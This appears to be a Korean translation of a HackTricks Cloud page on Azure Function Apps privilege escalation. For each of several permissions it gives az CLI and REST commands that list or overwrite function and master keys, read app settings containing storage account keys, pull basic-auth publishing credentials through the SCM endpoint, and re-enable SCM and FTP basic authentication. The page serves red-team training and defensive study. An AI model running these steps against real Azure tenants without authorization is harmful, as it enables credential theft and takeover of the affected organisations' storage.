# Az - Functions App Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Function Apps

다음 페이지에서 더 많은 정보를 확인하세요:

{% content-ref url="../az-services/az-function-apps.md" %}
[az-function-apps.md](../az-services/az-function-apps.md)
{% endcontent-ref %}

### Microsoft.Web/sites/host/listkeys/action

이 권한은 지정된 함수의 함수, 마스터 및 시스템 키를 나열할 수 있지만 호스트 키는 나열할 수 없습니다.
```bash
az functionapp keys list --resource-group <res_group> --name <func-name>
```
{% endcode %}

### Microsoft.Web/sites/functions/listKeys/action

이 권한은 지정된 함수의 호스트 키를 가져올 수 있습니다: 

{% code overflow="wrap" %}
```bash
az rest --method POST --uri "https://management.azure.com/subscriptions/<subsription-id>/resourceGroups/<resource-group>/providers/Microsoft.Web/sites/<func-name>/functions/<func-endpoint-name>/listKeys?api-version=2022-03-01"
```
{% endcode %}

### Microsoft.Web/sites/host/functionKeys/write

이 권한은 지정된 함수에 대한 함수 키를 생성/업데이트할 수 있습니다:

{% code overflow="wrap" %}
```bash
az functionapp keys set --resource-group <res_group> --key-name <key-name> --key-type functionKeys --name <func-key> --key-value q_8ILAoJaSp_wxpyHzGm4RVMPDKnjM_vpEb7z123yRvjAzFuo6wkIQ==
```
{% endcode %}

### Microsoft.Web/sites/host/masterKey/write

이 권한은 지정된 함수에 대한 마스터 키를 생성/업데이트할 수 있게 해줍니다:

{% code overflow="wrap" %}
```bash
az functionapp keys set --resource-group <res_group> --key-name <key-name> --key-type masterKey --name <func-key> --key-value q_8ILAoJaSp_wxpyHzGm4RVMPDKnjM_vpEb7z123yRvjAzFuo6wkIQ==
```
{% endcode %}

### Microsoft.Web/sites/host/systemKeys/write

이 권한은 지정된 함수에 시스템 함수 키를 생성/업데이트할 수 있습니다:

{% code overflow="wrap" %}
```bash
az functionapp keys set --resource-group <res_group> --key-name <key-name> --key-type masterKey --name <func-key> --key-value q_8ILAoJaSp_wxpyHzGm4RVMPDKnjM_vpEb7z123yRvjAzFuo6wkIQ==
```
{% endcode %}

### Microsoft.Web/sites/config/list/action

이 권한은 함수의 환경 변수를 가져올 수 있게 해줍니다. 이러한 변수 안에는 기본 env 변수 **`AzureWebJobsStorage`** 또는 **`WEBSITE_CONTENTAZUREFILECONNECTIONSTRING`**을 찾을 수 있을 가능성이 있으며, 이는 실제로 **FULL 권한으로 함수의 blob 저장소에 접근할 수 있는 계정 키를 포함하고 있습니다**.

{% code overflow="wrap" %}
```bash
az functionapp config appsettings list --name <func-name> --resource-group <res-group>
```
{% endcode %}



### `Microsoft.Web/sites/publishxml/action, (Microsoft.Web/sites/basicPublishingCredentialsPolicies/write)`

이 권한은 기본적으로 **기본 인증 자격 증명**을 포함하는 모든 게시 프로필을 나열할 수 있게 해줍니다:
```bash
# Gte creds
az functionapp deployment list-publishing-profiles \
--name basicauthenabled \
--resource-group Resource_Group_1 \
--output json
```
* **Method SCM**

그런 다음, 이러한 **기본 인증 자격 증명으로 함수 앱의 SCM URL**에 접근하여 env 변수의 값을 가져올 수 있습니다:
```bash
# Get env variables values
curl -u '<username>:<password>' \
https://<app-name>.scm.azurewebsites.net/api/settings -v
```
_다음에 유의하세요: **SCM 사용자 이름**은 일반적으로 문자 "$" 다음에 앱 이름이 오므로: `$<app-name>`입니다._

그리고 이러한 환경 변수는 함수 앱의 데이터를 저장하는 스토리지 계정의 **AccountKey**를 포함하고 있어 해당 스토리지 계정을 제어할 수 있습니다.

자격 증명이 **REDACTED**로 표시되면, 이는 **SCM 기본 인증 옵션을 활성화해야 하기 때문**이며, 이를 위해 두 번째 권한(`Microsoft.Web/sites/basicPublishingCredentialsPolicies/write`)이 필요합니다:

{% code overflow="wrap" %}
```bash
# Enable basic authentication for SCM
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/sites/<app-name>/basicPublishingCredentialsPolicies/scm?api-version=2022-03-01" \
--body '{
"properties": {
"allow": true
}
}'

# Enable basic authentication for FTP
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<subscription-id>/resourceGroups/<res-group>/providers/Microsoft.Web/sites/<app-name>/basicPublishingCredentialsPolicies/ftp?api-version=2022-03-01" \
--body '{
"properties": {
"allow": true
}
}'
```
{% endcode %}



{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**

</details>
{% endhint %}
